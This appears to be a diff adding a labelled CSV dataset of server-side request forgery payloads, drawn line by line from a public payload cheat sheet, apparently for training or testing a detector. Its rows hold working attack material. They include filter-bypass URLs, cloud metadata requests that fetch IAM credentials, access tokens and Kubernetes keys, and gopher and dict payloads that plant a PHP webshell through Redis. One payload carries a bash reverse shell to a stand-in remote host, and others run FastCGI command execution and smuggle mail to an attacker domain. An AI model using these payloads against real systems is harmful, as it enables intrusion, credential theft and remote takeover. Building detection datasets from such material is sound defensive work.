@@ -1,0 +1,280 @@
+payload,label,source
+- Python based scanner to find potential SSRF parameters,ssrf,payloads_all_the_things
+"- A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.",ssrf,payloads_all_the_things
+"Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server",ssrf,payloads_all_the_things
+"url = input(""Enter URL:"")",ssrf,payloads_all_the_things
+response = requests.get(url),ssrf,payloads_all_the_things
+return response,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/,ssrf,payloads_all_the_things
+localhost,ssrf,payloads_all_the_things
+Using `localhost`,ssrf,payloads_all_the_things
+http://localhost:80,ssrf,payloads_all_the_things
+http://localhost:22,ssrf,payloads_all_the_things
+https://localhost:443,ssrf,payloads_all_the_things
+127.0.0.1,ssrf,payloads_all_the_things
+Using `127.0.0.1`,ssrf,payloads_all_the_things
+http://127.0.0.1:80,ssrf,payloads_all_the_things
+http://127.0.0.1:22,ssrf,payloads_all_the_things
+https://127.0.0.1:443,ssrf,payloads_all_the_things
+Using `0.0.0.0`,ssrf,payloads_all_the_things
+http://0.0.0.0:80,ssrf,payloads_all_the_things
+http://0.0.0.0:22,ssrf,payloads_all_the_things
+https://0.0.0.0:443,ssrf,payloads_all_the_things
+[::],ssrf,payloads_all_the_things
+Using unspecified address in IPv6 `[::]`,ssrf,payloads_all_the_things
+http://[::]:80/,ssrf,payloads_all_the_things
+[0000::1],ssrf,payloads_all_the_things
+Using IPv6 loopback addres`[0000::1]`,ssrf,payloads_all_the_things
+http://[0000::1]:80/,ssrf,payloads_all_the_things
+http://[0:0:0:0:0:ffff:127.0.0.1],ssrf,payloads_all_the_things
+http://[::ffff:127.0.0.1],ssrf,payloads_all_the_things
+"NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1",ssrf,payloads_all_the_things
+127.0.0.0/8,ssrf,payloads_all_the_things
+http://127.127.127.127,ssrf,payloads_all_the_things
+http://127.0.1.3,ssrf,payloads_all_the_things
+http://127.0.0.0,ssrf,payloads_all_the_things
+http://0/,ssrf,payloads_all_the_things
+http://127.1,ssrf,payloads_all_the_things
+http://127.0.1,ssrf,payloads_all_the_things
+http://2130706433/ = http://127.0.0.1,ssrf,payloads_all_the_things
+http://3232235521/ = http://192.168.0.1,ssrf,payloads_all_the_things
+http://3232235777/ = http://192.168.1.1,ssrf,payloads_all_the_things
+http://2852039166/ = http://169.254.169.254,ssrf,payloads_all_the_things
+http://0177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
+http://o177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
+http://0o177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
+http://q177.0.0.1/ = http://127.0.0.1,ssrf,payloads_all_the_things
+http://0x7f000001 = http://127.0.0.1,ssrf,payloads_all_the_things
+http://0xc0a80101 = http://192.168.1.1,ssrf,payloads_all_the_things
+http://0xa9fea9fe = http://169.254.169.254,ssrf,payloads_all_the_things
+http://127.0.0.1/%61dmin,ssrf,payloads_all_the_things
+http://127.0.0.1/%2561dmin,ssrf,payloads_all_the_things
+Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`,ssrf,payloads_all_the_things
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com,ssrf,payloads_all_the_things
+\d,ssrf,payloads_all_the_things
+"Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.",ssrf,payloads_all_the_things
+::1   localhost ip6-localhost ip6-loopback,ssrf,payloads_all_the_things
+in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6,ssrf,payloads_all_the_things
+http://ip6-localhost = ::1,ssrf,payloads_all_the_things
+http://ip6-loopback = ::1,ssrf,payloads_all_the_things
+vulnerable.com/index.php?url=http://redirect-server,ssrf,payloads_all_the_things
+http://localhost,ssrf,payloads_all_the_things
+Redirects to `http://localhost` with `307 Temporary Redirect` status code,ssrf,payloads_all_the_things
+https://307.r3dir.me/--to/?url=http://localhost,ssrf,payloads_all_the_things
+Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code,ssrf,payloads_all_the_things
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me,ssrf,payloads_all_the_things
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
+$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
+Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms,ssrf,payloads_all_the_things
+Address: 1.2.3.4,ssrf,payloads_all_the_things
+Address: 169.254.169.254,ssrf,payloads_all_the_things
+http://127.1.1.1:80\@127.2.2.2:80/,ssrf,payloads_all_the_things
+http://127.1.1.1:80\@@127.2.2.2:80/,ssrf,payloads_all_the_things
+http://127.1.1.1:80:\@@127.2.2.2:80/,ssrf,payloads_all_the_things
+http://127.1.1.1:80#\@127.2.2.2:80/,ssrf,payloads_all_the_things
+http:127.0.0.1/,ssrf,payloads_all_the_things
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/,ssrf,payloads_all_the_things
+`urllib2` treats `1.1.1.1` as the destination,ssrf,payloads_all_the_things
+`requests` and browsers redirect to `2.2.2.2`,ssrf,payloads_all_the_things
+`urllib` resolves to `3.3.3.3`,ssrf,payloads_all_the_things
+http://127.0.0.1/,ssrf,payloads_all_the_things
+Some parsers replace `http:127.0.0.1/` to `http://127.0.0.1/`,ssrf,payloads_all_the_things
+filter_var(),ssrf,payloads_all_the_things
+http://test???test.com,ssrf,payloads_all_the_things
+`http://test???test.com`,ssrf,payloads_all_the_things
+0://evil.com:80;http://google.com:80/,ssrf,payloads_all_the_things
+`0://evil.com:80;http://google.com:80/`,ssrf,payloads_all_the_things
+"echo var_dump(filter_var(""http://test???test.com"", FILTER_VALIDATE_URL));",ssrf,payloads_all_the_things
+"echo var_dump(filter_var(""0://evil.com;google.com"", FILTER_VALIDATE_URL));",ssrf,payloads_all_the_things
+jar:scheme://domain/path!/,ssrf,payloads_all_the_things
+jar:http://127.0.0.1!/,ssrf,payloads_all_the_things
+jar:https://127.0.0.1!/,ssrf,payloads_all_the_things
+jar:ftp://127.0.0.1!/,ssrf,payloads_all_the_things
+file:///etc/passwd,ssrf,payloads_all_the_things
+file://\/\/etc/passwd,ssrf,payloads_all_the_things
+ssrf.php?url=http://127.0.0.1:22,ssrf,payloads_all_the_things
+ssrf.php?url=http://127.0.0.1:80,ssrf,payloads_all_the_things
+ssrf.php?url=http://127.0.0.1:443,ssrf,payloads_all_the_things
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>,ssrf,payloads_all_the_things
+ssrf.php?url=dict://attacker:11111/,ssrf,payloads_all_the_things
+ssrf.php?url=sftp://evil.com:11111/,ssrf,payloads_all_the_things
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET,ssrf,payloads_all_the_things
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit,ssrf,payloads_all_the_things
+ssrf.php?url=netdoc:///etc/passwd,ssrf,payloads_all_the_things
+gopher://,ssrf,payloads_all_the_things
+gopher://[host]:[port]/[type][selector],ssrf,payloads_all_the_things
+gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A,ssrf,payloads_all_the_things
+https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg,ssrf,payloads_all_the_things
+from urllib.parse import quote,ssrf,payloads_all_the_things
+"domain,tld = ""example.lab"".split('.')",ssrf,payloads_all_the_things
+"dns_request =  b""\x01\x03\x03\x07""    # BITMAP",ssrf,payloads_all_the_things
+"dns_request += b""\x00\x01""            # QCOUNT",ssrf,payloads_all_the_things
+"dns_request += b""\x00\x00""            # ANCOUNT",ssrf,payloads_all_the_things
+"dns_request += b""\x00\x00""            # NSCOUNT",ssrf,payloads_all_the_things
+"dns_request += b""\x00\x00""            # ARCOUNT",ssrf,payloads_all_the_things
+dns_request += len(domain).to_bytes() # LEN DOMAIN,ssrf,payloads_all_the_things
+dns_request += domain.encode()        # DOMAIN,ssrf,payloads_all_the_things
+dns_request += len(tld).to_bytes()    # LEN TLD,ssrf,payloads_all_the_things
+dns_request += tld.encode()           # TLD,ssrf,payloads_all_the_things
+"dns_request += b""\x00""                # DNAME EOF",ssrf,payloads_all_the_things
+"dns_request += b""\x00\xFC""            # QTYPE AXFR (252)",ssrf,payloads_all_the_things
+"dns_request += b""\x00\x01""            # QCLASS IN (1)",ssrf,payloads_all_the_things
+"dns_request = len(dns_request).to_bytes(2, byteorder=""big"") + dns_request",ssrf,payloads_all_the_things
+print(f'gopher://127.0.0.1:25/_{quote(dns_request)}'),ssrf,payloads_all_the_things
+gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01,ssrf,payloads_all_the_things
+curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd,ssrf,payloads_all_the_things
+/usr/share/php/PEAR.php,ssrf,payloads_all_the_things
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00,ssrf,payloads_all_the_things
+python2.7 ./gopherus.py --exploit pymemcache,ssrf,payloads_all_the_things
+python2.7 ./gopherus.py --exploit rbmemcache,ssrf,payloads_all_the_things
+python2.7 ./gopherus.py --exploit phpmemcache,ssrf,payloads_all_the_things
+python2.7 ./gopherus.py --exploit dmpmemcache,ssrf,payloads_all_the_things
+$ python2.7 ./gopherus.py --exploit mysql,ssrf,payloads_all_the_things
+Give MySQL username: root,ssrf,payloads_all_the_things
+Give query to execute: SELECT 123;,ssrf,payloads_all_the_things
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01,ssrf,payloads_all_the_things
+/var/www/html,ssrf,payloads_all_the_things
+/var/www/html/file.php,ssrf,payloads_all_the_things
+CONFIG SET dir /var/www/html,ssrf,payloads_all_the_things
+CONFIG SET dbfilename file.php,ssrf,payloads_all_the_things
+"SET mykey ""<?php system($_GET[0])?>""",ssrf,payloads_all_the_things
+SAVE,ssrf,payloads_all_the_things
+dict://,ssrf,payloads_all_the_things
+Getting a webshell with `dict://`,ssrf,payloads_all_the_things
+dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html,ssrf,payloads_all_the_things
+dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php,ssrf,payloads_all_the_things
+"dict://127.0.0.1:6379/SET%20mykey%20""<\x3Fphp system($_GET[0])\x3F>""",ssrf,payloads_all_the_things
+dict://127.0.0.1:6379/SAVE,ssrf,payloads_all_the_things
+Getting a PHP reverse shell with `gopher://`,ssrf,payloads_all_the_things
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml,ssrf,payloads_all_the_things
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php,ssrf,payloads_all_the_things
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22,ssrf,payloads_all_the_things
+gopher://127.0.0.1:6379/_save,ssrf,payloads_all_the_things
+$commands = array(,ssrf,payloads_all_the_things
+"'HELO victim.com',",ssrf,payloads_all_the_things
+"'MAIL FROM: <admin@victim.com>',",ssrf,payloads_all_the_things
+"'RCPT To: <User@[ATTACKER.DOMAIN.TLD]>',",ssrf,payloads_all_the_things
+"'DATA',",ssrf,payloads_all_the_things
+"'Subject: @hacker!',",ssrf,payloads_all_the_things
+"'Hello Friend',",ssrf,payloads_all_the_things
+'.',ssrf,payloads_all_the_things
+"$payload = implode('%0A', $commands);",ssrf,payloads_all_the_things
+header('Location: gopher://0:25/_'.$payload);,ssrf,payloads_all_the_things
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py,ssrf,payloads_all_the_things
+EnableRemoteCommands=1,ssrf,payloads_all_the_things
+gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D,ssrf,payloads_all_the_things
+"[Pong [EN] | FCSC 2024 - Arthur Deloffre (@Vozec1) - April 12, 2024](https://vozec.fr/writeups/pong-fcsc2024-en/)",ssrf,payloads_all_the_things
+"[Pong [EN] | FCSC 2024 - Kévin - Mizu (@kevin_mizu) - April 13, 2024](https://mizu.re/post/pong)",ssrf,payloads_all_the_things
+IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`,ssrf,payloads_all_the_things
+IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`,ssrf,payloads_all_the_things
+"export TOKEN=`curl -X PUT -H ""X-aws-ec2-metadata-token-ttl-seconds: 21600"" ""http://169.254.169.254/latest/api/token""`",ssrf,payloads_all_the_things
+"curl -H ""X-aws-ec2-metadata-token:$TOKEN"" -v ""http://169.254.169.254/latest/meta-data""",ssrf,payloads_all_the_things
+http://[fd00:ec2::254]/latest/meta-data/,ssrf,payloads_all_the_things
+IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`,ssrf,payloads_all_the_things
+http://instance-data,ssrf,payloads_all_the_things
+http://169.254.169.254,ssrf,payloads_all_the_things
+http://169.254.169.254.nip.io/,ssrf,payloads_all_the_things
+Static:http://nicob.net/redir6a,ssrf,payloads_all_the_things
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-,ssrf,payloads_all_the_things
+http://425.510.425.510 Dotted decimal with overflow,ssrf,payloads_all_the_things
+http://2852039166 Dotless decimal,ssrf,payloads_all_the_things
+http://7147006462 Dotless decimal with overflow,ssrf,payloads_all_the_things
+http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal,ssrf,payloads_all_the_things
+http://0xA9FEA9FE Dotless hexadecimal,ssrf,payloads_all_the_things
+http://0x41414141A9FEA9FE Dotless hexadecimal with overflow,ssrf,payloads_all_the_things
+http://0251.0376.0251.0376 Dotted octal,ssrf,payloads_all_the_things
+http://0251.00376.000251.0000376 Dotted octal with padding,ssrf,payloads_all_the_things
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal),ssrf,payloads_all_the_things
+http://[::ffff:a9fe:a9fe] IPV6 Compressed,ssrf,payloads_all_the_things
+http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded,ssrf,payloads_all_the_things
+http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4,ssrf,payloads_all_the_things
+http://[fd00:ec2::254] IPV6,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/iam/security-credentials,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME],ssrf,payloads_all_the_things
+http://169.254.169.254/latest/user-data,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/ami-id,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/reservation-id,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/hostname,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/public-keys/,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/dynamic/instance-identity/document,ssrf,payloads_all_the_things
+https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance,ssrf,payloads_all_the_things
+Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`,ssrf,payloads_all_the_things
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/,ssrf,payloads_all_the_things
+*Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`,ssrf,payloads_all_the_things
+curl http://169.254.170.2/v2/credentials/<UUID>,ssrf,payloads_all_the_things
+http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role,ssrf,payloads_all_the_things
+aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/,ssrf,payloads_all_the_things
+http://localhost:9001/2018-06-01/runtime/invocation/next,ssrf,payloads_all_the_things
+http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next,ssrf,payloads_all_the_things
+http://169.254.169.254/computeMetadata/v1/,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1/,ssrf,payloads_all_the_things
+http://metadata/computeMetadata/v1/,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1/instance/hostname,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1/instance/id,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1/project/project-id,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true,ssrf,payloads_all_the_things
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json,ssrf,payloads_all_the_things
+SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token,ssrf,payloads_all_the_things
+Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json,ssrf,payloads_all_the_things
+Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`,ssrf,payloads_all_the_things
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json,ssrf,payloads_all_the_things
+$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA,ssrf,payloads_all_the_things
+"""issued_to"": ""101302079XXXXX"",",ssrf,payloads_all_the_things
+"""audience"": ""10130207XXXXX"",",ssrf,payloads_all_the_things
+"""scope"": ""https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring"",",ssrf,payloads_all_the_things
+"""expires_in"": 2443,",ssrf,payloads_all_the_things
+"""access_type"": ""offline""",ssrf,payloads_all_the_things
+"curl -X POST ""https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata""",ssrf,payloads_all_the_things
+"-H ""Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA""",ssrf,payloads_all_the_things
+"-H ""Content-Type: application/json""",ssrf,payloads_all_the_things
+"--data '{""items"": [{""key"": ""sshkeyname"", ""value"": ""sshkeyvalue""}]}'",ssrf,payloads_all_the_things
+https://developers.digitalocean.com/documentation/metadata/,ssrf,payloads_all_the_things
+curl http://169.254.169.254/metadata/v1/id,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1.json,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/id,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/user-data,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/hostname,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/region,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address,ssrf,payloads_all_the_things
+All in one request:,ssrf,payloads_all_the_things
+curl http://169.254.169.254/metadata/v1.json | jq,ssrf,payloads_all_the_things
+https://metadata.packet.net/userdata,ssrf,payloads_all_the_things
+https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/v1/maintenance,ssrf,payloads_all_the_things
+https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/instance?api-version=2017-04-02,ssrf,payloads_all_the_things
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text,ssrf,payloads_all_the_things
+http://169.254.169.254/openstack,ssrf,payloads_all_the_things
+http://169.254.169.254/2009-04-04/meta-data/,ssrf,payloads_all_the_things
+http://192.0.0.192/latest/,ssrf,payloads_all_the_things
+http://192.0.0.192/latest/user-data/,ssrf,payloads_all_the_things
+http://192.0.0.192/latest/meta-data/,ssrf,payloads_all_the_things
+http://192.0.0.192/latest/attributes/,ssrf,payloads_all_the_things
+http://100.100.100.200/latest/meta-data/,ssrf,payloads_all_the_things
+http://100.100.100.200/latest/meta-data/instance-id,ssrf,payloads_all_the_things
+http://100.100.100.200/latest/meta-data/image-id,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/hostname,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/instance-id,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/private-networks,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/availability-zone,ssrf,payloads_all_the_things
+http://169.254.169.254/hetzner/v1/metadata/region,ssrf,payloads_all_the_things
+curl -L http://127.0.0.1:2379/version,ssrf,payloads_all_the_things
+curl http://127.0.0.1:2379/v2/keys/?recursive=true,ssrf,payloads_all_the_things
+http://127.0.0.1:2375/v1.24/containers/json,ssrf,payloads_all_the_things
+Simple example,ssrf,payloads_all_the_things
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash,ssrf,payloads_all_the_things
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json,ssrf,payloads_all_the_things
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json,ssrf,payloads_all_the_things
+Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>,ssrf,payloads_all_the_things
+Docker Engine API: <https://docs.docker.com/engine/api/latest/>,ssrf,payloads_all_the_things
+curl http://rancher-metadata/<version>/<path>,ssrf,payloads_all_the_things
